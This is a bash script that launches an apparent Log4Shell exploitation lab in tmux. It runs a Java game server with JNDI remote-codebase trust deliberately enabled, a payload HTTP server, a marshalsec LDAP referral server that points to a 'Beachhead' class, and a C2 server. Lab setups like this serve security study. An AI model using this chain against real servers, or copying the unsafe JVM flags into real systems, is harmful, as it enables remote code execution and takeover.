#!/bin/bash

SESSION="lab"

# Start session
tmux new-session -d -s $SESSION -n "Launcher"

# Window 0: Launcher
tmux send-keys -t $SESSION:0 "prismlauncher" C-m

# Window 1: Lab
tmux new-window -t $SESSION -n "Lab"

# Create 4 panes first
tmux split-window -h -t $SESSION:1        # pane 1
tmux split-window -v -t $SESSION:1.0      # pane 2
tmux split-window -v -t $SESSION:1.1      # pane 3

# Make layout clean (2x2)
tmux select-layout -t $SESSION:1 tiled

# Small delay to ensure panes are ready
sleep 0.5

# Now send commands to correct panes

# Pane 0: Server
tmux send-keys -t $SESSION:1.0 "cd ~/log4jlab/server && java -Xmx1024M -Xms1024M -Dcom.sun.jndi.ldap.object.trustURLCodebase=true -Dcom.sun.jndi.rmi.object.trustURLCodebase=true -jar server.jar nogui" C-m

# Pane 1: HTTP Server
tmux send-keys -t $SESSION:1.1 "cd ~/log4jlab/payload && python3 -m http.server 8888" C-m

# Pane 2: Marshalsec
tmux send-keys -t $SESSION:1.2 "cd ~/log4jlab/marshalsec && java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer 'http://127.0.0.1:8888/#Beachhead'" C-m

# Pane 3: C2 Server
tmux send-keys -t $SESSION:1.3 "cd ~/564Capstone/c2-server && docker start capstone-c2-server-draft && python3 -m http.server 8000" C-m

# Attach
tmux attach -t $SESSION
